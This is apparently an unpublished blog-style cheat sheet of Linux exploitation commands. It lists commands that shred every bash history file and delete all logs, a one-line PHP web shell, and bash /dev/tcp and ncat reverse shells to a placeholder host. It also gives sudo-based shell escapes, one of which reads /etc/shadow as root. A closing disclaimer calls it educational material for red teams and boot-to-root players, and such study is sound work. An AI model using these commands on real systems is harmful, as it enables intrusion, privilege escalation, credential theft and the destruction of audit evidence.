---
title: Linux Exploitation Cheatsheet
date: 2019-12-22 14:40:00 -08:00
permalink: exploit-cheatsheet
published: false
categories:
- Security
author: Kirin
---

### This page serves to catalog various web shells, reverse shells, privilege escalation, and other manual exploitation methods.

# --- Detection Avoidance ---  

\- Mac Spoofing -  
`ip link set dev eth0 down`  
`ip link set dev eth0 address <mac>`  
`ip link set dev eth0 up`  

\- Disable history recording -  
`unset HISTFILE ; history -c ; rm -rf ~/.*_history`  

\- Remove ALL Bash history files -  
`find / -name .bash_history -type f -exec shred -vfuz {} \; 2> /dev/null`  

\- Remove ALL LOGS -  
`for d in "$(find /var/log -type d)"; do find $d -type f -exec shred -vfuz {} \; ; rm -rf $d ; done`  

## --- Remote Shells ---  

\- PHP Web Shell -  
 `<?php system($_GET['x']);?>`  

\- /dev/tcp Reverse Shell -  
`bash -i >& /dev/tcp/10.3.3.7/1337 0>&1`  

\- ncat Reverse Shell -  
`ncat <10.3.3.7> 1337 -e /bin/bash`  

## --- Shell Spawning & Privilege Escalation ---  

\- Python -  
`echo os.system('/bin/bash')`  
`python -c 'import pty; pty.spawn("/bin/bash")'`  

\- Perl -  
`perl â€”e 'exec "/bin/sh";'`  

\- Ruby -  
`ruby: exec "/bin/sh"`  
`/usr/bin/ruby -e 'require "irb" ; IRB.start(__FILE__)' + exec '/bin/sh'`  
(From within IRB)  
`exec "/bin/sh"`  

\- Lua -  
`lua: os.execute('/bin/sh')`  

\- Vi -  
`:!bash`  
`:set shell=/bin/bash:shell`  

\- Nmap -  
`!sh`  
`nmap -- interactive`  
(Replace me with nmap NSE code)  

\- Git -  
`sudo git help status` - then type `!/bin/bash`  

\- Tcpdump -  
1. `echo $'id\ncat /etc/shadow' > /tmp/.test`  
2. `chmod +x /tmp/.test`  
3. `sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root`  

\- Find -  
`find /tmp/ -name 1 -exec bash -p \;`  

\- More/Less -  
`!/bin/bash`  

Disclaimer: It should go without saying, DO NOT use anything you find on this website for malicious purposes. This website serves to document various tools red-team members, individuals trying to solve Boot-2-Root challenges, or methods an attacker would use that IT security should understand can be used against them. This is for purely educational purposes.  
